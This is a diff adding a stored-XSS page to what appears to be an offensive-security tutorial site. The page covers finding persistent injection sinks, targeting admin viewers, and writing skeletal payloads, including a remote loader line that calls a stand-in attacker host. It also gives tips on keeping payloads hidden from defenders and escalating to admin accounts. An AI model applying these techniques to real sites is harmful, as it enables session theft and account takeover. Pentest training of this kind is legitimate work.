@@ -1,0 +1,107 @@
+---
+title: Stored XSS
+description: Persistent XSS where the payload is saved server-side and executes for everyone who views the poisoned content - injection sinks, victim modeling, and admin-targeted impact.
+mitre: [T1059.007, T1185, T1539]
+d3fend: [D3-AH]
+impact: [SessionTakeover, AccountTakeover, AdminCompromise]
+owasp: [A05]
+noise: moderate
+sidebar:
+  order: 3
+  label: Stored
+---
+import { Aside, Steps } from '@astrojs/starlight/components';
+
+The payload is written to server-side storage - a database row, a file, a cache - and rendered back on every later view of that content. No link to deliver and no per-victim step: whoever loads the page runs your code. That makes stored XSS the highest-impact variant, and the one most likely to land in front of an administrator.
+
+## TL;DR
+
+```
+# Inject once, into anything that gets displayed back later
+POST /comment   text=<script>...</script>
+POST /profile   bio=<img src=x onerror=...>
+
+# Then the payload fires for every viewer of that comment / profile / ticket
+```
+
+Success indicator: the payload executes when you (or another user) simply **view** the page - no crafted URL, no click. Reload the page in a clean session and it still fires.
+
+## Why stored XSS is the dangerous one
+
+| | Reflected | Stored |
+|---|---|---|
+| Delivery | Must send each victim a crafted URL | None - payload is already on the page |
+| Reach | One click at a time | Every viewer of the content |
+| Admin exposure | Only if you can get an admin to click | Natural - staff review user content (tickets, reports, profiles) |
+| Persistence | Dies with the request | Lives until the row is deleted |
+
+The practical upshot: a stored payload in a support ticket, product review, or user profile is viewed by moderators and admins as part of their job. That turns XSS into a path to an **admin session** without any social engineering - see [Blind XSS](../blind-xss/) for the case where that admin view happens somewhere you can't see.
+
+## Step 1 - Find the persistence sinks
+
+Any field whose value is shown to someone later is a candidate. The highest-yield sinks:
+
+- Comments, reviews, forum/thread posts, chat messages
+- Profile fields: display name, bio, "about", website, location
+- Support tickets, contact forms, feedback (often rendered in a staff-only panel → [blind](../blind-xss/))
+- Uploaded **filenames** and file metadata (EXIF, document author) rendered into a listing
+- Any value re-displayed in an admin dashboard, moderation queue, log viewer, or emailed notification
+
+<Steps>
+
+1. Submit a unique canary (`xss7a9c`) into each storable field.
+2. Browse everywhere that value might surface - the obvious page, but also listings, search results, notification emails, admin views you can reach.
+3. Where the canary appears, read the surrounding markup to get the context (same as [reflected](../reflected/) - the payload class depends on it).
+4. Note any field whose output you *cannot* see - those are blind sinks; switch to the out-of-band method in [Blind XSS](../blind-xss/).
+
+</Steps>
+
+## Step 2 - Account for the rendering context (and where it differs)
+
+A stored value can be rendered in several places with different encoding in each - a profile name shown raw in the header but entity-encoded in the page title, for instance. The injection succeeds in whichever sink encodes it least. Build the payload for the context where it lands unencoded; see [Payload construction](/codex/web/xss/payload-construction/).
+
+<Aside type="caution">
+Preview panes lie. Many apps sanitize the *preview* you see on submission but store and later render the raw value elsewhere. Always verify against the real rendered view, in a separate session, not the confirmation screen.
+</Aside>
+
+## Step 3 - Model the victim before weaponizing
+
+Because stored XSS fires for whoever views it, decide *who* that is - it shapes the payload:
+
+- **Any user** (public comment): broad, opportunistic. A cookie-steal or drive-by fits.
+- **Staff/admin only** (ticket, report, moderation queue): target the privileged session. The payload should do something useful with admin rights - create an attacker admin account via the app's own API, read admin-only data - because the admin's browser can make authenticated requests the app trusts.
+- **Unknown** (you can't see the render): treat as [blind](../blind-xss/) and start with an out-of-band beacon to confirm execution and learn the context.
+
+Keep the payload small and quiet if it will sit in persistent storage where defenders may find it. Load the real logic from a remote script so the stored value is just `<script src=//<ATTACKER>/x></script>` - see [Blind XSS](../blind-xss/) for the remote-script pattern and [XSS to session](/codex/web/sessions/xss-to-session/) for the exfil receiver.
+
+## Step 4 - Confirm, then clean up
+
+- Confirm by viewing the content in a fresh session (ideally a different browser profile) so you know it fires for *other* people, not just your own authenticated view.
+- A stored payload that visibly breaks the page (a mangled comment, a blank profile) invites deletion. If you need it to persist for a slow-to-arrive admin view, make it visually inert - see the inert/`setInterval` variants in [Defacement](../defacement/) for the DOM-cleanup techniques.
+
+## Common failure modes
+
+- **Canary stored but never rendered raw.** The app output-encodes on display - correct defense. Look for a second render location (listing, email, admin panel) that may not encode.
+- **Fires for you but not others.** You may be seeing a self-only reflection or a per-user preview. Verify cross-session.
+- **Length limits truncate the payload.** Use a minimal loader (`<script src=//<ATTACKER>/x>`) and keep the logic remote; see minimal payloads in [Payload construction](/codex/web/xss/payload-construction/).
+- **Stored but execution happens out of view.** That is [Blind XSS](../blind-xss/) - switch to an OOB beacon.
+
+## Quick reference
+
+| Step | Action |
+|---|---|
+| Sinks | Comments, profiles, tickets, filenames, anything re-displayed |
+| Canary | Unique marker per field; hunt every render location |
+| Context | Read markup at each render; pick payload accordingly |
+| Victim | Public vs. staff/admin vs. blind - shapes the payload |
+| Confirm | View in a clean, separate session |
+| Escalate | [Session theft](/codex/web/sessions/xss-to-session/); admin-targeted → app API abuse |
+
+## Next move
+
+- **Payload fires for any viewer** → opportunistic session theft via [XSS to session](/codex/web/sessions/xss-to-session/)
+- **Sink is a staff/admin-only view** → target the privileged session; use the app's own admin API from the victim's browser
+- **Can't see where it renders** → [Blind XSS](../blind-xss/) with an out-of-band beacon
+- **Payload too long for the field** → remote-script loader; see [Payload construction](/codex/web/xss/payload-construction/)
+- **Output is entity-encoded** → check other render locations; if all encode, see [Filter bypasses](/codex/web/xss/filter-bypasses/) for partial-encoding gaps
+- **Got an admin session** → log in as admin; look for [file upload](/codex/web/uploads/) → RCE or command-exec settings
